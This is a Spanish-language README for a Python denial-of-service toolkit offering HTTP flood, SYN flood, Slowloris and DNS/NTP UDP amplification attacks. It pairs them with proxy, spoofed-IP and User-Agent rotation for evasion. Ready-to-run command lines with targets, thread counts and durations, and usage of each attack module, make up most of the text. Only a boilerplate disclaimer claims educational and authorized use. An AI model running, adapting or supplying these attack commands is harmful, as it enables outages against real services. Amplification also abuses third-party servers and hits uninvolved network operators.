# DoS-Toolkit Python

Implementación en Python de ataques DoS multi-tipo con módulos core reutilizables.

## Características

- **HTTP-Flood**: Envía múltiples solicitudes HTTP GET/POST
- **SYN-Flood**: Inunda con paquetes SYN malformados
- **Slowloris**: Mantiene conexiones HTTP abiertas indefinidamente
- **UDP-Amplification**: Explota servidores DNS/NTP para amplificar tráfico
- **Proxy Utils**: Rotación de proxies, IPs y User-Agents

## Instalación

```bash
pip install -r requirements.txt
```

## Uso

### Desde el CLI Principal

```bash
python ../cli.py
```

Selecciona:
1. Python
2. Tipo de ataque
3. Ingresa parámetros (IP, puerto, threads, duración)

### Uso Directo

```bash
# HTTP-Flood
python attacks.py --attack http_flood --target 192.168.1.1 --port 80 --threads 50 --duration 60

# SYN-Flood (requiere permisos de admin)
python attacks.py --attack syn_flood --target 192.168.1.1 --port 443 --threads 100 --duration 120

# Slowloris
python attacks.py --attack slowloris --target 10.0.0.1 --port 8080 --threads 30 --duration 300

# UDP-Amplification
python attacks.py --attack udp_amplification --target 192.168.1.100 --port 53 --threads 200 --duration 60
```

## Módulos Core

### http_flood.py
```python
from core.http_flood import HTTPFlood

flood = HTTPFlood('target.com', 80)
flood.send_request()  # GET
flood.send_post_request(data='test=1')  # POST
```

### syn_flood.py
```python
from core.syn_flood import SYNFlood

syn = SYNFlood('192.168.1.1', 443)
syn.send_syn_packet()  # Requiere permisos de root
syn.send_syn_packet_simple()  # Versión simplificada
```

### slowloris.py
```python
from core.slowloris import Slowloris

slow = Slowloris('target.com', 80)
slow.send_slow_request()
slow.create_connection()
slow.maintain_connection(sock)
```

### udp_amp.py
```python
from core.udp_amp import UDPAmplification

udp = UDPAmplification('192.168.1.1', 53, 'dns')
udp.send_amplified_packet()
udp.send_dns_amplification('example.com')
udp.send_ntp_amplification()
```

### utils_proxy.py
```python
from core.utils_proxy import ProxyUtils, IPRotation, UserAgentRotation

# Proxies
proxy = ProxyUtils()
proxy.add_proxy('http://10.10.1.10:3128')
proxy.get_random_proxy()

# IPs
ip_rot = IPRotation()
ip_rot.generate_random_ip()

# User-Agents
ua = UserAgentRotation()
ua.get_random_user_agent()
```

## Parámetros

- `--attack`: Tipo de ataque (http_flood, syn_flood, slowloris, udp_amplification)
- `--target`: IP o dominio objetivo
- `--port`: Puerto (default 80)
- `--threads`: Número de threads (default 100)
- `--duration`: Duración en segundos (default 60)

## Requisitos

- Python 3.6+
- Permisos de administrador para SYN-Flood
- Conexión a internet para UDP-Amplification

## Advertencia

⚠️ **USO SOLO CON FINES EDUCATIVOS Y AUTORIZADOS**

Este toolkit está diseñado para:
- Pruebas de seguridad autorizadas
- Investigación académica
- Laboratorios de seguridad

El uso no autorizado es ilegal.

## Estructura

```
python/
├── attacks.py           # Controlador principal
├── core/
│   ├── __init__.py
│   ├── http_flood.py
│   ├── syn_flood.py
│   ├── slowloris.py
│   ├── udp_amp.py
│   └── utils_proxy.py
├── requirements.txt
└── README.md
```

## Licencia

Educativo - Uso responsable
